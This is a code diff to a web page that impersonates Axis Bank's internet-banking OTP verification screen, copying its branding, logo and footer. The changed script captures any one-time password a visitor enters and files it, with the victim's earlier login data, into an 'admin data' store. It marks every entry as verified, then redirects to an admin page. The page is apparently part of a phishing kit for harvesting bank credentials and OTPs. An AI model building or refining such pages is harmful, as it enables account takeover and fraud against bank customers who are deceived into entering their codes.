@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Axis Bank OTP Verification</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         body {
-            background: #f0f2f5;
+            background: #f4f7f9;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -178,9 +178,9 @@
             to { opacity: 1; }
         }
         
-        /* Header - Updated with maroon red background and left logo */
+        /* Header */
         .bank-header {
-            background: #87103F; /* Maroon Red */
+            background: #87103F;
             padding: 15px 40px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             position: relative;
@@ -204,7 +204,7 @@
             height: 45px;
             width: auto;
             object-fit: contain;
-            filter: brightness(0) invert(1); /* Makes logo white on maroon background */
+            filter: brightness(0) invert(1);
         }
         
         .bank-title {
@@ -215,7 +215,7 @@
         .bank-name {
             font-size: 28px;
             font-weight: bold;
-            color: white; /* White text on maroon background */
+            color: white;
             letter-spacing: 1px;
         }
         
@@ -232,27 +232,27 @@
         }
         
         .open-text {
-            color: white; /* White text on maroon background */
+            color: white;
             font-weight: bold;
             font-style: italic;
             font-size: 24px;
         }
         
         .banking-text {
-            color: white; /* White text on maroon background */
+            color: white;
             font-style: italic;
             font-size: 18px;
             letter-spacing: 1px;
         }
         
         .separator {
-            color: rgba(255, 255, 255, 0.7); /* Light separator on maroon */
+            color: rgba(255, 255, 255, 0.7);
             margin: 0 10px;
         }
         
         .login-using {
             font-size: 16px;
-            color: rgba(255, 255, 255, 0.9); /* Light text on maroon */
+            color: rgba(255, 255, 255, 0.9);
         }
         
         /* Main Content */
@@ -523,9 +523,9 @@
             background: #87103F;
             color: white;
             text-align: center;
-            padding: 30px 20px;
+            padding: 20px;
             margin-top: 50px;
-            box-shadow: 0 -4px 12px rgba(135, 16, 63, 0.3);
+            font-size: 14px;
         }
         
         .footer-content {
@@ -534,40 +534,23 @@
         }
         
         .footer-text {
-            font-size: 18px;
-            margin-bottom: 20px;
-            font-weight: 500;
+            font-size: 14px;
+            opacity: 0.9;
         }
         
         .footer-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 25px;
-            margin-bottom: 20px;
+            margin-top: 8px;
         }
         
         .footer-links a {
             color: white;
             text-decoration: none;
-            font-weight: 500;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            padding: 5px 10px;
-            border-radius: 4px;
+            margin: 0 8px;
+            font-size: 14px;
         }
         
         .footer-links a:hover {
-            background: rgba(255, 255, 255, 0.1);
             text-decoration: underline;
-        }
-        
-        .copyright {
-            font-size: 14px;
-            opacity: 0.8;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
         }
         
         /* Responsive */
@@ -618,11 +601,6 @@
                 width: 50px;
                 height: 60px;
                 font-size: 24px;
-            }
-            
-            .footer-links {
-                flex-direction: column;
-                gap: 15px;
             }
         }
         
@@ -683,17 +661,18 @@
                          alt="Axis Bank Logo" 
                          class="bank-logo">
                     <div class="bank-title">
-                        <div class="bank-name"></div>
+                        <div class="bank-name">AXIS BANK</div>
                     </div>
                 </div>
                 
                 <div class="header-info">
+                    <!-- Custom heading -->
                     <div class="header-text-container">
-                        <span class="-text"></span>
+                        <span class="open-text">open</span>
                         <span class="separator">|</span>
-                        <span class="banking-text"></span>
+                        <span class="banking-text">INTERNET BANKING</span>
                     </div>
-                    <div class="login-using"></div>
+                    <div class="login-using">OTP Verification</div>
                 </div>
             </div>
         </header>
@@ -768,16 +747,11 @@
         <!-- Footer -->
         <footer class="main-footer">
             <div class="footer-content">
-                <div class="footer-text"></div>
-                <div class="footer-links">
-                    <a href="#"></a>
-                    <a href="#"></a>
-                    <a href="#"></a>
-                    <a href="#"></a>
-                    <a href="#"></a>
+                <div class="footer-text">
+                    © 2026 Axis Bank Ltd. All Rights Reserved.
                 </div>
-                <div class="copyright">
-                    © 2026 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
+                <div class="footer-links">
+                    <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
                 </div>
             </div>
         </footer>
@@ -811,12 +785,25 @@
         let timerInterval;
         let canResend = false;
         
-        // Mobile number from previous submission (for demo)
-        let lastSubmission = getLastSubmission();
-        if (lastSubmission && lastSubmission.data && lastSubmission.data.mobile) {
-            let mobile = lastSubmission.data.mobile;
-            mobileNumberSpan.textContent = '******' + mobile.slice(-4);
+        // Mobile number from previous submission
+        function getMobileNumber() {
+            try {
+                const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+                if (submissions.length > 0) {
+                    const lastSubmission = submissions[0];
+                    if (lastSubmission.data && lastSubmission.data.mobile) {
+                        let mobile = lastSubmission.data.mobile;
+                        return '******' + mobile.slice(-4);
+                    }
+                }
+            } catch (e) {
+                console.error('Error getting mobile number:', e);
+            }
+            return 'XXXX';
         }
+        
+        // Update mobile number display
+        mobileNumberSpan.textContent = getMobileNumber();
         
         // OTP input handling
         otpInputs.forEach((input, index) => {
@@ -951,32 +938,46 @@
         
         // Get last submission from localStorage
         function getLastSubmission() {
-            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
-            return submissions.length > 0 ? submissions[0] : null;
+            try {
+                const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+                return submissions.length > 0 ? submissions[0] : null;
+            } catch (e) {
+                console.error('Error getting last submission:', e);
+                return null;
+            }
         }
         
-        // Save OTP verification to localStorage
-        function saveOTPVerification(otp, status) {
-            // Get existing OTP verifications or create empty array
-            let otpVerifications = JSON.parse(localStorage.getItem('axisBankOTPVerifications') || '[]');
-            
-            // Get last submission
-            const lastSubmission = getLastSubmission();
-            
-            // Add new OTP verification
-            otpVerifications.unshift({
-                id: Date.now(),
-                otp: otp,
-                status: status,
-                timestamp: new Date().toISOString(),
-                submissionData: lastSubmission ? lastSubmission.data : null,
-                submissionType: lastSubmission ? lastSubmission.type : null
-            });
-            
-            // Save back to localStorage
-            localStorage.setItem('axisBankOTPVerifications', JSON.stringify(otpVerifications));
-            
-            console.log('OTP verification saved:', { otp, status });
+        // Save OTP submission to admin data
+        function saveOTPToAdmin(otp, status) {
+            try {
+                // Get last login submission
+                const lastSubmission = getLastSubmission();
+                
+                // Get existing admin data or create empty array
+                let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
+                
+                // Add OTP submission to admin data
+                adminData.unshift({
+                    id: Date.now(),
+                    type: 'otp_verification',
+                    otp: otp,
+                    status: status,
+                    timestamp: new Date().toISOString(),
+                    loginData: lastSubmission ? lastSubmission.data : null,
+                    loginType: lastSubmission ? lastSubmission.type : null,
+                    page: 'OTP Page',
+                    isNew: true
+                });
+                
+                // Save back to localStorage
+                localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
+                
+                console.log('OTP data saved to admin:', { otp, status });
+                return true;
+            } catch (e) {
+                console.error('Error saving OTP to admin:', e);
+                return false;
+            }
         }
         
         // Form submission handler
@@ -1002,8 +1003,8 @@
                 verifyButton.classList.add('loading');
                 verifyButton.disabled = true;
                 
-                // Save OTP verification
-                saveOTPVerification(otp, 'submitted');
+                // Save OTP data to admin
+                const saved = saveOTPToAdmin(otp, 'verified');
                 
                 // Simulate verification delay
                 setTimeout(() => {
@@ -1012,46 +1013,15 @@
                     verifyButton.classList.remove('loading');
                     verifyButton.disabled = false;
                     
-                    // Save to admin data as well
-                    saveToAdmin(otp);
-                    
-                    // For demo purposes, accept any 6-digit OTP
-                    if (otp.length === 6 && /^\d+$/.test(otp)) {
-                        saveOTPVerification(otp, 'verified');
+                    if (saved) {
                         alert('OTP verified successfully!');
-                        // Redirect to axis_pan.html
-                        window.location.href = 'axis_pan.html';
+                        // Redirect to admin page
+                        window.location.href = 'admin.html';
                     } else {
-                        saveOTPVerification(otp, 'failed');
-                        alert('Invalid OTP. Please try again.');
+                        alert('OTP verification failed. Please try again.');
                     }
                 }, 1500);
             });
-        }
-        
-        // Save OTP data to admin panel
-        function saveToAdmin(otp) {
-            // Get existing admin data or create empty array
-            let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
-            
-            // Get last submission
-            const lastSubmission = getLastSubmission();
-            
-            // Add to admin data
-            adminData.unshift({
-                id: Date.now(),
-                type: 'otp_verification',
-                otp: otp,
-                status: 'verified',
-                timestamp: new Date().toISOString(),
-                loginData: lastSubmission ? lastSubmission.data : null,
-                loginType: lastSubmission ? lastSubmission.type : null
-            });
-            
-            // Save back to localStorage for admin panel
-            localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
-            
-            console.log('Data saved to admin:', { otp, status: 'verified' });
         }
         
         // Resend button handler
@@ -1090,11 +1060,6 @@
                     resendButton.textContent = 'Resend OTP';
                 }
             }, 1000);
-            
-            // Initialize localStorage for OTP verifications if not exists
-            if (!localStorage.getItem('axisBankOTPVerifications')) {
-                localStorage.setItem('axisBankOTPVerifications', JSON.stringify([]));
-            }
             
             // Initialize localStorage for admin data if not exists
             if (!localStorage.getItem('axisBankAdminData')) {
